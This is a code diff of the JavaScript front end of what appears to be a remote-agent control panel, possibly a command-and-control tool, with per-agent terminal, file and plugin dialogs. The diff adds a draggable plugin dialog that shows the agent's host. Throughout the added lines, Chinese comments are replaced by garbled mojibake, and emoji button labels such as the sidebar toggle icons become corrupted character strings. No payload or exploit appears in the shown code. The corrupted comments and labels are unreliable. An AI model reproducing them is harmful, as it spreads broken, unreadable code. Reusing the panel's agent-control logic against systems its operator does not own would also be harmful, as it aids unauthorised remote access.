                 styleLink.rel = "stylesheet";
                 document.head.appendChild(styleLink);
             }
-            // 创建弹出框
+            // 鍒涘缓寮瑰嚭妗�
             const dialog = document.createElement("div");
             dialog.id = "modify-server-dialog";
             const closeButton = document.createElement("button");
             closeButton.type = "button";
             closeButton.className = "dialog-close-btn modify-server-close-btn";
-            closeButton.textContent = "×";
+            closeButton.textContent = "x";
             closeButton.setAttribute("aria-label", "Close response header dialog");
             closeButton.onclick = () => {
                 document.body.removeChild(dialog);
             };
             dialog.appendChild(closeButton);
-            // 标题
+            // 鏍囬
             const title = document.createElement("h3");
             title.textContent = "Edit Response Header (JSON)";
             dialog.appendChild(title);
-            // 文本框
+            // 鏂囨湰妗�
             const textarea = document.createElement("textarea");
             textarea.placeholder = "{\n  \"Content-Type\": \"application/json\",\n  \"Cache-Control\": \"no-cache\"\n}";
             if (currentHeader) {
@@ -3512,10 +3569,10 @@ class lain_server {
                 }
             }
             dialog.appendChild(textarea);
-            // 按钮容器
+            // 鎸夐挳瀹瑰櫒
             const buttonContainer = document.createElement("div");
             buttonContainer.className = "button-container";
-            // 保存按钮
+            // 淇濆瓨鎸夐挳
             const saveButton = document.createElement("button");
             saveButton.textContent = "Save";
             saveButton.onclick = async () => {
@@ -3586,27 +3643,27 @@ class lain_server {
         }
     }
 
-    // 下载配置
+    // 涓嬭浇閰嶇疆
     downloadConfig(port) {
-        // 根据 port 找到对应的 server
+        // 鏍规嵁 port 鎵惧埌瀵瑰簲鐨� server
         const server = server_data.find(server => server.port === port);
         if (!server) {
             customLog("Server not found for port: " + port);
             return;
         }
-        // 转换为 JSON 字符串
+        // 杞崲涓� JSON 瀛楃涓�
         const configData = JSON.stringify(server, null, 4);
-        // 创建 Blob 对象
+        // 鍒涘缓 Blob 瀵硅薄
         const blob = new Blob([configData], { type: "application/json" });
         const url = URL.createObjectURL(blob);
-        // 创建下载链接
+        // 鍒涘缓涓嬭浇閾炬帴
         const a = document.createElement("a");
         a.href = url;
         a.download = "server_config_" + port + ".json";
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
-        // 释放 URL
+        // 閲婃斁 URL
         URL.revokeObjectURL(url);
     }
     async redirectToAgentCode(protocol,os,server,path,connPath,msgPath,switch_key,encry_key,
@@ -3657,9 +3714,9 @@ class lain_chat{
     renderChatItem(data) {
         console.log("renderChatItem:", data);
         if (!data) return;
-        // 如果传入的是接口完整返回 {data: []}
+        // 濡傛灉浼犲叆鐨勬槸鎺ュ彛瀹屾暣杩斿洖 {data: []}
 
-        // 下面开始处理单条消息
+        // 涓嬮潰寮€濮嬪鐞嗗崟鏉℃秷鎭�
         let chat_div = document.getElementById("chat_div");
         if (!chat_div) return;
     
@@ -3667,12 +3724,12 @@ class lain_chat{
         div.className = "chat_message";
         div.setAttribute("data-chatid", data.chatid);
     
-        // 自己的消息
+        // 鑷繁鐨勬秷鎭�
         if (data.username === Username) {
             div.classList.add("me");
         }
     
-        // 头部
+        // 澶撮儴
         let header = document.createElement("div");
         header.style.display = "flex";
         header.style.justifyContent = "space-between";
@@ -3683,10 +3740,10 @@ class lain_chat{
     
         header.appendChild(usernameSpan);
     
-        // 只有自己的消息显示删除按钮
+        // 鍙湁鑷繁鐨勬秷鎭樉绀哄垹闄ゆ寜閽�
         if (data.username === Username || data.username === "history fil") {
             let delBtn = document.createElement("span");
-            delBtn.innerText = "×";
+            delBtn.innerText = "x";
             delBtn.style.cssText =
                 "cursor:pointer;color:#888;margin-left:8px;";
     
@@ -3702,12 +3759,12 @@ class lain_chat{
         }
     
         div.appendChild(header);
-        // 消息内容
+        // 娑堟伅鍐呭
         if (data.type === "file") {
             let link = document.createElement("a");
             link.href = "javascript:void(0);";
             link.className = "file_link";
-            link.innerText = "📎 " + data.message;
+            link.innerText = "📎" + data.message;
     
             link.style.color = "#007BFF";
             link.style.textDecoration = "none";
@@ -3724,13 +3781,13 @@ class lain_chat{
             msgDiv.innerText = data.message;
             div.appendChild(msgDiv);
         }
-        // 时间
+        // 鏃堕棿
         let timeSpan = document.createElement("span");
         timeSpan.className = "chat_time";
         timeSpan.innerText = data.time;
         div.appendChild(timeSpan);
         chat_div.appendChild(div);
-        // 自动滚到底部
+        // 鑷姩婊氬埌搴曢儴
         chat_div.scrollTop = chat_div.scrollHeight;
     }
     async sendChat() {
@@ -3813,7 +3870,7 @@ class lain_chat{
                             Math.floor(offset / total * 100)
                         );
                     pendingDiv.innerText =
-                        "📎 "
+                        "📎"
                         + file.name
                         + " "
                         + percent
@@ -3821,7 +3878,7 @@ class lain_chat{
                 }
             );
             pendingDiv.innerText =
-                "📎 "
+                "📎"
                 + file.name
                 + " uploaded";
         }catch(e){
@@ -3830,7 +3887,7 @@ class lain_chat{
                 e
             );
             pendingDiv.innerText =
-                "❌ "
+                "❌"
                 + file.name
                 + " failed";
             pendingDiv.style.color="red";
@@ -3927,7 +3984,7 @@ function toggleInfo(uid,op) {
     infoContent.classList.toggle("show");
 }
 
-// 打开 iframe
+// 鎵撳紑 iframe
 function openIframe(url) {
     var iframePanel = document.getElementById('iframePanel');
     var iframe = document.getElementById('iframe');
@@ -3935,12 +3992,12 @@ function openIframe(url) {
     iframePanel.style.display = 'block';
 }
 
-// 关闭 iframe
+// 鍏抽棴 iframe
 function closeIframe() {
     var iframePanel = document.getElementById('iframePanel');
     iframePanel.style.display = 'none';
 }
-// 切换侧边栏
+// 鍒囨崲渚ц竟鏍�
 function toggleSidebar() {
     const sidebar = document.querySelector('.sidebar');
     const button = document.querySelector('.toggle-button');
@@ -3961,9 +4018,9 @@ function toggleSidebar() {
     }
 }
 
-// 窗口调整大小
+// 绐楀彛璋冩暣澶у皬
 document.addEventListener("DOMContentLoaded", function () {
-    // **只调整 .server_index > .content 和 #log 的高度**
+    // **鍙皟鏁� .server_index > .content 鍜� #log 鐨勯珮搴�**
     const logDiv = document.getElementById("log");
     const logContent = document.getElementById("log-content");
     const logHandle = logDiv.querySelector(".resize-handle");
@@ -4003,7 +4060,7 @@ document.addEventListener("DOMContentLoaded", function () {
         document.removeEventListener("touchend", stopResize);
     }
 
-    // 初始化高度自适应
+    // 鍒濆鍖栭珮搴﹁嚜閫傚簲
     function setInitialHeights() {
         const total = serverIndexDiv.offsetHeight;
         const contentH = Math.floor(total * 0.8);
@@ -4017,7 +4074,7 @@ document.addEventListener("DOMContentLoaded", function () {
     logHandle.addEventListener("mousedown", startResize);
     logHandle.addEventListener("touchstart", startResize);
 
-    // **iframe 拖动**
+    // **iframe 鎷栧姩**
     const iframePanel = document.getElementById("iframePanel");
     const dragHandle = iframePanel.querySelector(".drag-handle");
     let isDragging = false, offsetX, offsetY;
@@ -4057,7 +4114,7 @@ document.addEventListener("DOMContentLoaded", function () {
     dragHandle.addEventListener("mousedown", startDrag);
     dragHandle.addEventListener("touchstart", startDrag);
 
-    // **侧边栏导航**
+    // **渚ц竟鏍忓鑸�**
     const links = document.querySelectorAll(".sidebar a, .tle-sidebar a");
     const sections = document.querySelectorAll(".content > div");
 
@@ -4078,17 +4135,17 @@ document.addEventListener("DOMContentLoaded", function () {
         });
     });
 
-    // **默认选中第一个**
+    // **榛樿閫変腑绗竴涓�**
     if (links.length > 0) {
         showSection(links[0].getAttribute("data-target"));
     }
 });
 
 document.addEventListener('DOMContentLoaded', function () {
-    // 选择电脑端和手机端的侧边栏
+    // 閫夋嫨鐢佃剳绔拰鎵嬫満绔殑渚ц竟鏍�
     const links = document.querySelectorAll('.sidebar a, .tle-sidebar a');
     const sections = document.querySelectorAll('.content > div');
-    // 为每个链接添加点击事件
+    // 涓烘瘡涓摼鎺ユ坊鍔犵偣鍑讳簨浠�
     links.forEach(link => {
         link.addEventListener('click', function (e) {
             e.preventDefault();
@@ -4102,60 +4159,99 @@ document.addEventListener('DOMContentLoaded', function () {
             });
         });
     });
-    // 侧边栏显示/隐藏按钮事件
+    // 渚ц竟鏍忔樉绀�/闅愯棌鎸夐挳浜嬩欢
     document.getElementById("tel-toggleBtn").addEventListener("click", function() {
         const sidebar = document.getElementById("tle-sidebar");
         if (sidebar.style.display === "none" || sidebar.style.display === "") {
             sidebar.style.display = "block";
-            this.textContent = "🔽";
+            this.textContent = "馃斀";
         } else {
             sidebar.style.display = "none";
-            this.textContent = "📋";
+            this.textContent = "馃搵";
         }
     });
 });
 function showPluginDialog(uid, os, paramDescList, codeword) {
-    // 解析参数
+    // 瑙ｆ瀽鍙傛暟
     let paramDescArray = paramDescList ? decodeURIComponent(paramDescList).split(',') : [];
+    const currentAgent = Array.isArray(User_data) ?
+        User_data.find(function(agent) {
+            return agent && agent.uid === uid;
+        }) :
+        null;
+    const host = currentAgent ?
+        (currentAgent.host || currentAgent.Host || "") :
+        "";
     if (!uid || !os || !paramDescList || !codeword) {
         customAlert("Missing required parameters for plugin dialog.");
         return;
     }
 
-    // 弹窗容器
-    let dialog = document.getElementById("plugin-dialog");
+    // 寮圭獥瀹瑰櫒
+    const dialogId = "plugin-dialog-" + uid;
+    let dialog = document.getElementById(dialogId);
+    if (dialog) {
+        dialog.style.display = "block";
+        dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
+        const firstInput = dialog.querySelector('input[type="text"]');
+        if (firstInput) {
+            firstInput.focus();
+        }
+        return;
+    }
     if (!dialog) {
         dialog = document.createElement("form");
-        dialog.id = "plugin-dialog";
+        dialog.id = dialogId;
+        dialog.dataset.uid = uid;
         dialog.style.position = "fixed";
         dialog.style.top = "10%";
         dialog.style.left = "50%";
         dialog.style.transform = "translateX(-50%)";
         dialog.style.background = "#f9f9f9";
-        dialog.style.zIndex = 9999;
+        dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
         dialog.style.maxWidth = "95vw";
         dialog.style.width = "95%";
         dialog.style.margin = "40px auto";
         dialog.style.border = "1px solid #ccc";
         dialog.style.borderRadius = "8px";
         dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";
-        dialog.style.padding = "16px";
+        dialog.style.padding = "48px 16px 16px";
+        dialog.style.userSelect = "none";
         document.body.appendChild(dialog);
-    } else {
-        dialog.innerHTML = ""; // 清空旧内容
     }
 
-    // 关闭按钮
+    const dragBar = document.createElement("div");
+    dragBar.style.position = "absolute";
+    dragBar.style.top = "0";
+    dragBar.style.left = "0";
+    dragBar.style.width = "100%";
+    dragBar.style.height = "36px";
+    dragBar.style.cursor = "move";
+    dragBar.style.background = "rgba(0,0,0,0.05)";
+    dragBar.style.borderTopLeftRadius = "8px";
+    dragBar.style.borderTopRightRadius = "8px";
+    dragBar.style.touchAction = "none";
+    dragBar.setAttribute("aria-label", "Drag plugin dialog");
+    dialog.appendChild(dragBar);
+
     let closeBtn = document.createElement("button");
     closeBtn.type = "button";
-    closeBtn.textContent = "close";
-    closeBtn.style.float = "right";
+    closeBtn.className = "dialog-close-btn";
+    closeBtn.textContent = "x";
+    closeBtn.setAttribute("aria-label", "close plugin dialog");
     closeBtn.onclick = function() {
         dialog.remove();
     };
     dialog.appendChild(closeBtn);
+    let hostLabel = document.createElement("div");
+    hostLabel.textContent = "Host: " + (host || "-");
+    hostLabel.style.margin = "0 0 12px 0";
+    hostLabel.style.fontSize = "12px";
+    hostLabel.style.color = "#5f6f82";
+    hostLabel.style.paddingRight = "48px";
+    dialog.appendChild(hostLabel);
 
-    // 参数输入框
+    // 鍙傛暟杈撳叆妗�
     paramDescArray.forEach(desc => {
         let input = document.createElement('input');
         input.type = 'text';
@@ -4168,7 +4264,7 @@ function showPluginDialog(uid, os, paramDescList, codeword) {
         dialog.appendChild(input);
     });
 
-    // 提交按钮
+    // 鎻愪氦鎸夐挳
     let submitButton = document.createElement('button');
     submitButton.textContent = 'send';
     submitButton.style.padding = "10px 20px";
@@ -4181,7 +4277,66 @@ function showPluginDialog(uid, os, paramDescList, codeword) {
     };
     dialog.appendChild(submitButton);
 
-    // 发送消息函数
+    dialog.addEventListener("mousedown", function() {
+        dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
+    });
+
+    let isDragging = false;
+    let offsetX = 0;
+    let offsetY = 0;
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(value, max));
+    }
+
+    function onMove(event) {
+        if (!isDragging) {
+            return;
+        }
+        if (event.cancelable) {
+            event.preventDefault();
+        }
+        const point = event.touches ? event.touches[0] : event;
+        const rect = dialog.getBoundingClientRect();
+        const maxLeft = Math.max(0, window.innerWidth - rect.width);
+        const maxTop = Math.max(0, window.innerHeight - rect.height);
+        dialog.style.left = clamp(point.clientX - offsetX, 0, maxLeft) + "px";
+        dialog.style.top = clamp(point.clientY - offsetY, 0, maxTop) + "px";
+        dialog.style.transform = "";
+    }
+
+    function stopMove() {
+        isDragging = false;
+        document.body.style.userSelect = "";
+        document.removeEventListener("mousemove", onMove);
+        document.removeEventListener("mouseup", stopMove);
+        document.removeEventListener("touchmove", onMove);
+        document.removeEventListener("touchend", stopMove);
+        document.removeEventListener("touchcancel", stopMove);
+    }
+
+    function startMove(event) {
+        if (event.cancelable) {
+            event.preventDefault();
+        }
+        const point = event.touches ? event.touches[0] : event;
+        const rect = dialog.getBoundingClientRect();
+        isDragging = true;
+        offsetX = point.clientX - rect.left;
+        offsetY = point.clientY - rect.top;
+        dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
+        document.body.style.userSelect = "none";
+        document.addEventListener("mousemove", onMove);
+        document.addEventListener("mouseup", stopMove);
+        document.addEventListener("touchmove", onMove, {passive: false});
+        document.addEventListener("touchend", stopMove);
+        document.addEventListener("touchcancel", stopMove);
+    }
+
+    dragBar.addEventListener("mousedown", startMove);
+    dragBar.addEventListener("touchstart", startMove, {passive: false});
+
+    // 鍙戦€佹秷鎭嚱鏁�
     async function sendMsg() {
         let inputs = dialog.querySelectorAll('input[type="text"]');
         let msgParts = [];
@@ -4459,16 +4614,16 @@ function customLog() {
     };
     scheduleFadeOut();
 }
-// 替代alert函数，使用自定义弹窗
+// 鏇夸唬alert鍑芥暟锛屼娇鐢ㄨ嚜瀹氫箟寮圭獥
 function customAlert(message) {
-    // 遮罩
+    // 閬僵
     let overlay = document.createElement("div");
     overlay.style.position = "fixed";
     overlay.style.inset = "0";
     overlay.style.background = "rgba(0,0,0,0.35)";
     overlay.style.zIndex = "9999";
 
-    // 弹窗
+    // 寮圭獥
     let alertBox = document.createElement("div");
     alertBox.style.position = "fixed";
     alertBox.style.top = "50%";
@@ -4485,9 +4640,9 @@ function customAlert(message) {
     alertBox.style.fontFamily = "Arial, sans-serif";
     alertBox.style.overflow = "auto";
 
-    // 关闭按钮
+    // 鍏抽棴鎸夐挳
     let closeButton = document.createElement("button");
-    closeButton.innerHTML = "×";
+    closeButton.innerHTML = "x";
     closeButton.style.position = "absolute";
     closeButton.style.right = "12px";
     closeButton.style.top = "8px";
@@ -4508,7 +4663,7 @@ function customAlert(message) {
         document.body.removeChild(overlay);
     };
     alertBox.appendChild(closeButton);
-    // 内容
+    // 鍐呭
     let messageText = document.createElement("pre");
     messageText.textContent = message;
     messageText.style.textAlign = "left";
@@ -4521,7 +4676,7 @@ function customAlert(message) {
     alertBox.appendChild(messageText);
     overlay.appendChild(alertBox);
     document.body.appendChild(overlay);
-    // 点击遮罩关闭
+    // 鐐瑰嚮閬僵鍏抽棴
     overlay.onclick = function(e) {
         if (e.target === overlay) {
             document.body.removeChild(overlay);
@@ -4530,14 +4685,14 @@ function customAlert(message) {
 }
 function customConfirm(message) {
     return new Promise((resolve) => {
-        // 遮罩
+        // 閬僵
         let overlay = document.createElement("div");
         overlay.style.position = "fixed";
         overlay.style.inset = "0";
         overlay.style.background = "rgba(0,0,0,0.35)";
         overlay.style.zIndex = "9999";
 
-        // 弹窗
+        // 寮圭獥
         let confirmBox = document.createElement("div");
         confirmBox.style.position = "fixed";
         confirmBox.style.top = "50%";
@@ -4553,7 +4708,7 @@ function customConfirm(message) {
         confirmBox.style.fontFamily = "Arial, sans-serif";
         confirmBox.style.textAlign = "center";
 
-        // 内容
+        // 鍐呭
         let messageText = document.createElement("div");
         messageText.textContent = message;
         messageText.style.fontSize = "16px";
@@ -4563,13 +4718,13 @@ function customConfirm(message) {
 
         confirmBox.appendChild(messageText);
 
-        // 按钮容器
+        // 鎸夐挳瀹瑰櫒
         let buttonBox = document.createElement("div");
         buttonBox.style.display = "flex";
         buttonBox.style.justifyContent = "center";
         buttonBox.style.gap = "20px";
 
-        // 确定按钮
+        // 纭畾鎸夐挳
         let okButton = document.createElement("button");
         okButton.textContent = "yes";
         okButton.style.width = "90px";
@@ -4580,7 +4735,7 @@ function customConfirm(message) {
         okButton.style.color = "#fff";
         okButton.style.cursor = "pointer";
 
-        // 取消按钮
+        // 鍙栨秷鎸夐挳
         let cancelButton = document.createElement("button");
         cancelButton.textContent = "no";
         cancelButton.style.width = "90px";
@@ -4610,7 +4765,7 @@ function customConfirm(message) {
 
         overlay.appendChild(confirmBox);
         document.body.appendChild(overlay);
-        // 点击外部关闭
+        // 鐐瑰嚮澶栭儴鍏抽棴
         overlay.onclick = function(e){
             if(e.target === overlay){
                 close(false);
@@ -4623,14 +4778,14 @@ function customConfirm(message) {
 window.lainIndex = new lain_index();
 window.l_index = window.l_index || new index();
 window.showTerminalDialog = function(uid, host, os) {
-    // 这里要用你的类实例，比如
+    // 杩欓噷瑕佺敤浣犵殑绫诲疄渚嬶紝姣斿
     if (window.lainIndex) {
         window.lainIndex.showTerminalDialog(uid, host, os);
     }
 };
-window.showFileDialog = function(uid, host) {
+window.showFileDialog = function(uid, host, dir) {
     if (window.lainIndex) {
-        window.lainIndex.showFileDialog(uid, host);
+        window.lainIndex.showFileDialog(uid, host, dir);
     }
 };
 window.showMsgDialog = function(uid, host) {
